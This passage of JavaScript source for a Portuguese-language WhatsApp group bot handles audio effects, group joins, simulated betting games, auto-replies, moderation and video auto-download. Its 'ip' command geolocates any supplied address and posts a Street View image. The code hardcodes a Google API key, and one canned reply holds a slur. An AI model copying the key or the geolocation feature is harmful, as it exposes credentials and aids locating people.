if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'bass':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'bass2':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'estourar':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'fast':
case 'audiorapido':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Erro')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'esquilo':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'audiolento': 
case 'slow':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break



//==========(EFEITOS-MARCAR)==========\\

case 'convite':
if(!SoDono) return enviar(arise.donosmt)
if(!budy.includes("chat.whatsapp.com")) return enviar("Cadê o link do grupo que você deseja que eu entre?")  
cnvt = args.join(" ")
enviar(`O convite para me entrar em seu grupo, foi enviado, espere o dono aceitar..`)
safeSendMessage(nmrdn, {text: mess.groupInvitation(sender, cnvt)}, {quoted: non})
break

case 'recusar':
if(!SoDono) return enviar(arise.donosmt)
safeSendMessage(`${q}@s.whatsapp.net`, {text: `Olá amigo(a), sinto muito dizer, mas seu convite foi recusado.`})
break;

case 'join': case 'entrar': {
if(!SoDono) return enviar(arise.donosmt)
string = args.join(' ');
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} link`)
if(string.includes('chat.whatsapp.com/') || enviar('Ops, verifique o link que você inseriu.') ) {
const link = string.split('app.com/')[1]
try {
reagir(from, "✅");
await client.groupAcceptInvite(`${link}`)
} catch(erro) {
reagir(from, "❌");
if(String(erro).includes('resource-limit') ) {
enviar('O grupo já está com o alcance de 257 membros.')
}
if(String(erro).includes('not-authorized') ) {
enviar('Não foi possível entrar no grupo.\nMotivo: Banimento.')
}
}
}
}
break

case 'sip': case 'ip': 
if (!q) return enviar(`🔹 Uso correto: ${prefix + command} 8.8.8.8`)
try {
ip = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(q)}`);
safeSendMessage(from, {image: {url: `https://maps.googleapis.com/maps/api/streetview?size=1400x1400&location=${ip.data.latitude},%20${ip.data.longitude}&sensor=false&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartNGg`}, caption: mess.searchIpAdress(ip)})
safeSendMessage(from, {location: {degreesLatitude: ip.data.latitude,degreesLongitude: ip.data.longitude, addrees: ''}})
} catch {
enviar(mess.error())
}
break

case 'cassino':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
horacass = moment.tz('America/Sao_Paulo').format('HH')
diacass = moment.tz('America/Sao_Paulo').format('DD')
mmcass = moment.tz('America/Sao_Paulo').format('MM')
AB = nolanrpg.map(i => i.id).indexOf(sender)
if(Number(args[0]) > Number(nolanrpg[AB].money)) return enviar(`Você não possui saldo suficiente para efetuar essa aposta...`)
if(Number(nolanrpg[AB].limiteC) === 0 && Number(nolanrpg[AB].horaC) === Number(horacass)) return enviar(`*Você já apostou muito hoje...* Suas chances estão esgotadas! Por favor, volte mais tarde! 😔😭`)
HC = Number(nolanrpg[AB].horaC) + 1
//acabou o limite...
if(Number(horacass) > Number(nolanrpg[AB].horaC) && Number(nolanrpg[AB].diaC) === Number(diacass) && Number(nolanrpg[AB].mC) === Number(mmcass)) {
nolanrpg[AB].limiteC = 20
nolanrpg[AB].horaC = horacass
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
enviar(`😝🤪 Mas já mlk? Bora apostar então, eu ainda vou sugar muito teu dinheiro!`)
}
//passar do dia pro outro...
if(Number(nolanrpg[AB].limiteC) === 0 && Number(diacass) > Number(nolanrpg[AB].diaC)) {
nolanrpg[AB].limiteC = 20
nolanrpg[AB].horaC = horacass
nolanrpg[AB].diaC = diacass
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
enviar(`💰🌟 ${tempo} caro jogador, como está a sua sorte hj?`)
}
//passar do mês pro outro...
if(Number(nolanrpg[AB].limiteC) === 0 && Number(mmcass) > Number(nolanrpg[AB].mC)) {
nolanrpg[AB].limiteC = 30
nolanrpg[AB].horaC = horacass
nolanrpg[AB].diaC = diacass
nolanrpg[AB].mC = mmcass
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
enviar(`📆🗣 Primeira aposta do mês? Eu ainda vou sugar muito teu dinheiro todo...`)
}
if(Number(nolanrpg[AB].limiteC) > 0) {
if(!q) {
return enviar(`Você deve escolher uma quantia para apostar... Ex: ${prefix + command} 100 _(você estará apostando R$ 100.00)_`)
}
if(Number(args[0]) < 10) return enviar(`Não é possível apostar menos que R$ 10.00`)
if(Number(args[0]) > 20000) return enviar(`Não é possível apostar mais que R$ 20000.00! 😿`)
if(!Number(args[0])) return enviar(`*${args[0]}* não é número! 😿`)
frutasC = JSON.parse(fs.readFileSync("./exports/json/slots.json"));
resulC = `${frutasC[Math.floor(Math.random()*frutasC.length)]} : ${frutasC[Math.floor(Math.random()*frutasC.length)]} : ${frutasC[Math.floor(Math.random()*frutasC.length)]}`
if(resulC == `🦴 : 🦴 : 🦴`) {
CC = Number(nolanrpg[AB].limiteC) - 1
nolanrpg[AB].money = 50
nolanrpg[AB].limiteC = CC
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
enviar(`• *[${resulC}]* - Óia a bruxa passando... Todo o dinheiro da sua conta agora é dela!`)
}
if(resulC == `🍫 : 🍫 : 🍫`){cmrpg = 1000};
if(resulC == `🍔 : 🍔 : 🍔`){cmrpg = 600};
if(resulC == `🥩 : 🥩 : 🥩`){cmrpg = 400};
if(resulC == `🍕 : 🍕 : 🍕`){cmrpg = 250};
if(resulC == `🌶️ : 🌶️ : 🌶️`){cmrpg = 200};
if(resulC == `🍪 : 🍪 : 🍪`){cmrpg = 100};
if(resulC == `🍗 : 🍗 : 🍗`){cmrpg = 80};
if(resulC == `🌭 : 🌭 : 🌭`){cmrpg = 70};
if(resulC == `🥞 : 🥞 : 🥞`){cmrpg = 60};
if(resulC == `🥓 : 🥓 : 🥓`){cmrpg = 50};
if((resulC == `🧇 : 🧇 : 🧇`) || (resulC == `🍞 : 🍞 : 🍞`) || (resulC == `🥐 : 🥐 : 🥐`) || (resulC == `🥥 : 🥥 : 🥥`) || (resulC == `🍎 : 🍎 : 🍎`) || (resulC == `🍌 : 🍌 : 🍌`) || (resulC == `🍓 : 🍓 : 🍓`)){cmrpg = 40};
if((resulC == `🍐 : 🍐 : 🍐`) || (resulC == `🍊 : 🍊 : 🍊`) || (resulC == `🍋 : 🍋 : 🍋`) || (resulC == `🍉 : 🍉 : 🍉`) || (resulC == `🍇 : 🍇 : 🍇`) || (resulC == `🍒 : 🍒 : 🍒`) || (resulC == `🍑 : 🍑 : 🍑`) || (resulC == `🥭 : 🥭 : 🥭`) || (resulC == `🍍 : 🍍 : 🍍`) || (resulC == `🥝 : 🥝 : 🥝`) || (resulC == `🍅 : 🍅 : 🍅`) || (resulC == `🥑 : 🥑 : 🥑`) || (resulC == `🌽 : 🌽 : 🌽`) || (resulC == `🥕 : 🥕 : 🥕`)){cmrpg = 30}
if((resulC == `🍫 : 🍫 : 🍫`) || (resulC == `🍔 : 🍔 : 🍔`) || (resulC == `🥩 : 🥩 : 🥩`) || (resulC == `🍕 : 🍕 : 🍕`) || (resulC == `🌶️ : 🌶️ : 🌶️`) || (resulC == `🍪 : 🍪 : 🍪`) || (resulC == `🍗 : 🍗 : 🍗`) || (resulC == `🌭 : 🌭 : 🌭`) || (resulC == `🥞 : 🥞 : 🥞`) || (resulC == `🥓 : 🥓 : 🥓`) || (resulC == `🧇 : 🧇 : 🧇`) || (resulC == `🍞 : 🍞 : 🍞`) || (resulC == `🥐 : 🥐 : 🥐`) || (resulC == `🥥 : 🥥 : 🥥`) || (resulC == `🍎 : 🍎 : 🍎`) || (resulC == `🍌 : 🍌 : 🍌`) || (resulC == `🍓 : 🍓 : 🍓`) || (resulC == `🍐 : 🍐 : 🍐`) || (resulC == `🍊 : 🍊 : 🍊`) || (resulC == `🍋 : 🍋 : 🍋`) || (resulC == `🍉 : 🍉 : 🍉`) || (resulC == `🍇 : 🍇 : 🍇`) || (resulC == `🍒 : 🍒 : 🍒`) || (resulC == `🍑 : 🍑 : 🍑`) || (resulC == `🥭 : 🥭 : 🥭`) || (resulC == `🍍 : 🍍 : 🍍`) || (resulC == `🥝 : 🥝 : 🥝`) || (resulC == `🍅 : 🍅 : 🍅`) || (resulC == `🥑 : 🥑 : 🥑`) || (resulC == `🌽 : 🌽 : 🌽`) || (resulC == `🥕 : 🥕 : 🥕`)) {
var Vitória = "Você acaba de ganhar"
var CC = Number(nolanrpg[AB].limiteC) - 1
var MR = nolanrpg[AB].money
var TT = Number(args[0]) * Number(cmrpg)
var TC = Number(TT) + Number(args[0])
var VT = Number(MR) + Number(TC) * 5
var Ctxt = `R$ ${Number(TC).toFixed(2)}`
nolanrpg[AB].money = VT
nolanrpg[AB].limiteC = CC
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
} else {
var Vitória = "Você perdeu! Como punição, você perderá"
var CC = Number(nolanrpg[AB].limiteC) - 1
var MR = nolanrpg[AB].money
var VT = Number(MR) - Number(args[0])
var Ctxt = `R$ ${Number(args[0]).toFixed(2)}`
nolanrpg[AB].money = VT
nolanrpg[AB].limiteC = CC
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
}
const cassino = `• *[${resulC}]* - ${Vitória} ${Ctxt}` 
enviar(cassino)
}
break

case 'dadoapostado':
setTimeout(() => {reagir(from, "🎲")}, 300)
if(!isModobn) return enviar(arise.brincadeira)   
if(!JSON.stringify(nolanrpg).includes(sender)) return enviar(`${tempo} usuário(a), novo? Use *rgcity*`)
var [d1, d2] = q.split('/')
if(!d1) return enviar(`Digite o valor do dado que você acha que irá cair... Após isso, coloque uma (/) ao lado e coloque uma quantia a ser apostada.\n–\nEx: ${prefix + command} 5/25 _(você estará apostando R$ 25.00 no dado 5)_`)
if(!d2) return enviar(`Você não disse quanto irá apostar...`)
AB = nolanrpg.map(i => i.id).indexOf(sender)
if(Number(nolanrpg[AB].money) < Number(d2)) return enviar(`Sua aposta é muito alta para o saldo na sua conta... Por favor, escolha uma aposta menor.`)
if(!Number(d1)) return enviar(`${d1} não é número!`)
if(!Number(d2)) return enviar(`${d2} não é número!`)
if(Number(d2) > 100) return enviar(`Não é possível apostar mais do que R$ 100.00`)
if(Number(d1) < 1 || Number(d1) > 6) return enviar(`Este número no dado não existe...`)
enviar(`Sorteando dado(s)!`)
dadoale = Math.floor(Math.random() * 5) + 1
enviarfigu(`./banco de dados/data/media/sticker/dados/${dadoale}.webp`)
if(Number(dadoale) === Number(d1)) {
DD = Number(nolanrpg[AB].money) + Number(d2)
nolanrpg[AB].money = DD
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
setTimeout(() => {
BC = nolanrpg.map(i => i.id).indexOf(sender)
mention(`🎉🌟 Parabéns *${sender.split("@")[0]}*, você ganhou R$ *${Number(d2).toFixed(2)}* por acertar a previsão do dado.`)
}, 5000)
} else {
DD = Number(nolanrpg[AB].money) - Number(d2)
nolanrpg[AB].money = DD
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
setTimeout(() => {
BD = nolanrpg.map(i => i.id).indexOf(sender)
mention(`😿 Infelizmente *${sender.split("@")[0]}*, você perdeu *R$ ${Number(d2).toFixed(2)}* por errar a previsão do dado.`)
}, 5000)
}
break

case 'caracoroa': //by vitinho
setTimeout(() => {reagir(from, "🪙")}, 300)
if(!isModobn) return enviar(arise.brincadeira)   
var [d1, d2] = q.split('/')
if(Number(d2) > 1000) return enviar("Tbm não pode passar de 1000 né meu camarada kkk")
if(d1.length == 0) return enviar(`Digite o lado que a moeda que você acha que irá cair, ou seja, cara ou coroa... Após isso, coloque uma (/) ao lado e coloque a quantia que você deseja apostar, por exemplo: 1.\n–\n• Ex: ${prefix + command} cara/25 _(você estará apostando R$25.00 na posição do lado da cara da moeda)_`);
if(d1.toLowerCase() != "cara" && d1.toLowerCase() != "coroa") return enviar("Só pode cara ou coroa.")
if(!d2) return enviar(`Você não disse quanto irá apostar...`)
AB = nolanrpg.map(i => i.id).indexOf(sender)
if(Number(nolanrpg[AB].money) < Number(d2)) return enviar(`Sua aposta é muito alta para o saldo na sua conta... Por favor, escolha uma aposta menor.`)
if(!Number(d2)) return enviar(`${d2} não é um número!`)
if(Number(d2) > 100) return enviar(`Não é possível apostar mais do que R$ 100.00`)
enviar(`Sorteando... Aguarde, daqui a pouco o resultado sai!`)
ladosDaMoeda = ["coroa", "cara"];
pegarInfo = ladosDaMoeda[Math.floor(Math.random() * ladosDaMoeda.length)];
enviarfigu(`./banco de dados/data/media/sticker/caracoroa/${pegarInfo}.webp`)
if(pegarInfo === d1) {
DD = Number(nolanrpg[AB].money) + Number(d2)
nolanrpg[AB].money = DD
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
setTimeout(() => {
BC = nolanrpg.map(i => i.id).indexOf(sender)
mention(`🎉🌟 Parabéns *${sender.split("@")[0]}*, você ganhou R$ *${Number(d2).toFixed(2)}* por acertar a posição da moeda.\n• O resultado da posição do lado da moeda era a : *${pegarInfo}*`)}, 5000)
} else {
DD = Number(nolanrpg[AB].money) - Number(d2)
nolanrpg[AB].money = DD
fs.writeFileSync("./banco de dados/usuarios/SystemRPG/nolanrpg.json", JSON.stringify(nolanrpg))
setTimeout(() => {
BD = nolanrpg.map(i => i.id).indexOf(sender)
mention(`😿 Infelizmente *${sender.split("@")[0]}*, você perdeu *R$ ${Number(d2).toFixed(2)}* por errar a posição da moeda.\n• O resultado da posição do lado da moeda era a : *${pegarInfo}*`)}, 5000)
}
break

//=======(FIM-EFEITOS-MARCAR)=========\\

default:

if(isCmd) {
setTimeout(() => {reagir(from, "❌")}, 1000)
AB = similarityCmd(command)
notcmd = privateCmd(sender, prefix+command, AB[0].comando, AB[0].porcentagem)
await enviar(notcmd);
}

if(budy == "zenomods") {
reagir(from, "🧙🏻‍♂️")
}
if(budy == "zeno") {
reagir(from, "🧙🏻‍♂️")
}
if(budy == "Zeno") {
reagir(from, "🧙🏻‍♂️")
}
if(budy == "dono") {
reagir(from, "🧙🏻‍♂️")
}
if(budy == "@558892153207") {
reagir(from, "🧙🏻‍♂️")
}
if(budy == `prefix`) {
enviar(`ᴍᴇᴜ ᴘʀᴇғɪxᴏ ᴀᴛᴜᴀʟ: [ ${prefix} ]`)
}
if(budy == `prefixo`) {
enviar(`ᴍᴇᴜ ᴘʀᴇғɪxᴏ ᴀᴛᴜᴀʟ: [ ${prefix} ]`)
}
if(budy == `Prefix`) {
enviar(`ᴍᴇᴜ ᴘʀᴇғɪxᴏ ᴀᴛᴜᴀʟ: [ ${prefix} ]`)
}
if(budy == `Prefixo`) {
enviar(`ᴍᴇᴜ ᴘʀᴇғɪxᴏ ᴀᴛᴜᴀʟ: [ ${prefix} ]`)
}
if(budy == `@639309649194 ${q}`) {
await escrever()
await sleep(1000)
if(!q) return enviar(`Como posso ajudar?`)
try {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
var openaxz = await fetchJson(`https://zero-two-apis.com.br/gemini/texto/imagem?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxz.resposta}`)
} catch (e) {
return enviar("🤖: Resposta não encontrada.")
}
}
if(isGroup && isBotGroupAdmins && !isGroupAdmins) {
if(isAntiCtt || Antiloc || isAnticatalogo) {
if(type === 'contactMessage' || type === 'contactsArrayMessage' || type === 'locationMessage' || type === 'productMessage') {
if(isGroupAdmins) return safeSendMessage(from, {text: mess.antisRandomMessage()}, {quoted: non})
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
clear = `🗑${"\n".repeat(255)}🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪᴅᴀ* ✅`
safeSendMessage(from, {text: clear, contextInfo : { forwardingScore: 500, isForwarded:true}})
safeSendMessage(from, {text: 'Reporte aos adminstradores do grupo sobre o ocorrido.', mentions: groupAdmins})
}}}

if(isGroup && isAntiFlood && !SoDono && isCmdPremium && !isPremium && isBotGroupAdmins && !isGroupAdmins && !isBot) { 
if(isLimitec == null){
var limitefl = limitefll.limitefl
} else {
var limitefl = isLimitec
}
if(budy.length >= limitefl){
setTimeout( () => {
return enviar(mess.charactersAnti())
console.log(colors.red('Deram spam de caracteres.'))
}, 100)
setTimeout(async () => {
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
client.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
}

//INICIO DE COMANDOS SEM PREFIXO
switch(testat){
}

const EnvAudio_SMP = async (direcao, nome1, nome2, nome3, nome4, nome5) => {
bla = [nome1, nome2, nome3, nome4, nome5]
for ( i of bla) {
if(i == undefined) return  
if(messagesC.includes(i)) {
safeSendMessage(from, {audio: {url: direcao}, mimetype: "audio/mpeg", ptt:true})
}}}

const EnvAudio2_SMP = async (direcao, nome1, nome2, nome3, nome4, nome5) => {
bla = [nome1, nome2, nome3, nome4, nome5]
for ( i of bla) {
if(i == undefined) return  
if(messagesC.includes(i)) {
safeSendMessage(from, {audio: {url: direcao}, mimetype: "audio/mpeg", ptt:true})
}}}

const EnvTXT_SMP = async (texto, nome1, nome2, nome3, nome4, nome5) => {
bla = [nome1, nome2, nome3, nome4, nome5]
for ( i of bla) {
if(i == undefined) return  
if(messagesC.includes(i)) {
safeSendMessage(from, {text: texto})
}}}

const EnvAudio2_GTTS = async (lingua, texto, txt1, txt2, txt3, txt4, txt5) => {
bla = [txt1, txt2, txt3, txt4, txt5]
for ( i of bla) {
if(i == undefined) return
if(budy2.includes(i)) {
var gtt = require('./exports/funcoes/gtts')(lingua)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
gtt.save(ranm, texto, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
DLT_FL(ranm)
buffer = fs.readFileSync(rano)
safeSendMessage(from, {audio: buffer, ptt:true}, {quoted: non})
DLT_FL(rano)
})
})
}}}


var hora_sla = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

if(isAutorepo) {
if(budy2 === "bot") {
enviar(`Olá ${pushname}, como posso ajudar?`)  
}
 
if(budy2.includes("bot corno")){
enviar(`Corno é vc ${pushname}`)
}

if(budy2.includes("adivinha meu celular") || budy2.includes("bot qual meu celular")){
enviar(`É um ${adivinha}`)
}

if(budy2.includes("boa noite")){
enviar(`Boa noite ${pushname}, 🌃`)
}

if(budy2.includes("boa tarde")){
enviar(`Boa tarde ${pushname}, 🌅`)
}

if(budy2.includes("bom dia")){
enviar(`Bom dia ${pushname}, 🌄`)
}

if(budy2.includes("corno")){
enviar(`Vou nem falar quem tem 50 chifres e ainda foi trocado por uma sapat#o 🤣`)
}
}

//=========[--ANTI PALAVRÃO --]==========\\

if(isGroup && isPalavrao && isBotGroupAdmins && !SoDono && !isGroupAdmins) {
 if(dataGp[0].antipalavrao.palavras.some(i => budy2.includes(i.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")))) {
setTimeout(() => {
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
setTimeout(() => {
safeSendMessage(from, {delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}, 2000)
safeSendMessage(from, {text: mess.permissionDenied_rUser()})
}
}

 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && budy != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
muehe = await simih(budy)
safeSendMessage(from, {text: muehe}, {quoted: non}).catch(e => {
enviar("Não entendi! Por favor, me explique!") 
})
}


if (isSimi2 && !isCmd && isGroup) {
if (type == 'conversation' || type == 'extendedTextMessage') {
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)
if (sami) safeSendMessage(from, {text: sami}, {quoted: non})
}
}

//============(AUTO DOWNLOAD)============\\

 if (isAutodown && !jaProcessou(info.key.id)) {
marcarComoProcessado(info.key.id);

const dominioinsta = ["instagram.com/reel", "instagram.com/share/reel"];
const dominioTikTok = ["tiktok.com", "https://vm.tiktok.com", "www.tiktok.com"];
const dominioFacebook = ["https://facebook.com", "facebook.com", "fb.com", "www.facebook.com"];
const dominioKwai = ["kwai.com", "www.kwai.com", "s.kw.ai"];
const dominioYouTube = ["youtube.com", "www.youtube.com", "youtu.be"];

const link = (texto) => {
const start = texto.indexOf("https://");
const end = texto.indexOf(" ", start) !== -1 ? texto.indexOf(" ", start) : texto.length;
return texto.substring(start, end);
};

try {
if (dominioinsta.some((d) => budy.includes(d))) {
const instagramLink = link(budy);
if (instagramLink) {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
reagir(from, '🎬');
await DownMp4(instagramLink, from);
reagir(from, "✅");
}
}

if (dominioTikTok.some((d) => budy.includes(d))) {
const TikTokLink = link(budy);
if (TikTokLink) {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
await reagir(from, '🎬');
await DownMp4(TikTokLink, from);
await reagir(from, "✅");
}
}

if (dominioFacebook.some((d) => budy.includes(d))) {
const FacebookLink = link(budy);
if (FacebookLink) {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
reagir(from, '🎬');
await DownMp4(FacebookLink, from);
reagir(from, "✅");
}
}

if (dominioKwai.some((d) => budy.includes(d))) {
const KwaiLink = link(budy);
if (KwaiLink) {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
reagir(from, '🎬');
ABC = await fetchJson(`https://zero-two-apis.com.br/api/kwai/video?url=${KwaiLink}&apikey=`+KEY_ZERO);
safeSendMessage(from, {video: {url: ABC.resultados.video}, mimetype: "video/mp4"}, {quoted: non});
reagir(from, "✅");
}
}

if (dominioYouTube.some((d) => budy.includes(d))) {
const YouTubeLink = link(budy);
if (YouTubeLink) {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
reagir(from, '🎬');
await DownMp4(YouTubeLink, from);
reagir(from, "✅");
}
}

} catch (error) {
console.error(error);
enviar("⚠️ Ocorreu um erro, a API caiu ou veja se o link é realmente de um video e não imagem.");
reagir(from, "❌")
}
}

//=====================================\\

}
}
}

const nmrdn = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`

async function vipFunctionTempo() {
if(premium.length > 0) {
for (y of premium) {
if(y.save != Number(moment.tz('America/Sao_Paulo').format('DD'))) {
y.save = Number(moment.tz('America/Sao_Paulo').format('DD'))
fs.writeFileSync("./banco de dados/usuarios/premium.json", JSON.stringify(premium))
if(y.infinito == false) {
if(y.dias > 1) {y.dias -= 1
fs.writeFileSync("./banco de dados/usuarios/premium.json", JSON.stringify(premium))
} else {
safeSendMessage(y.id, {text: `⚠️ O PERÍODO PREMIUM ACABOU!\nDeseja renovar? Use:
➤ ${prefix}comprarpremium 5\nApós o pagamento, confirme com:\n➤ ${prefix}verificarpremium\ne volte a ter acesso imediato!`})
AB = premium.map(b => b.id).indexOf(y.id)
premium.splice(AB, 1)
fs.writeFileSync("./banco de dados/usuarios/premium.json", JSON.stringify(premium))
}}}}}}

async function tmpCardAluguelFunction() {
if(aluguel.length > 0) {
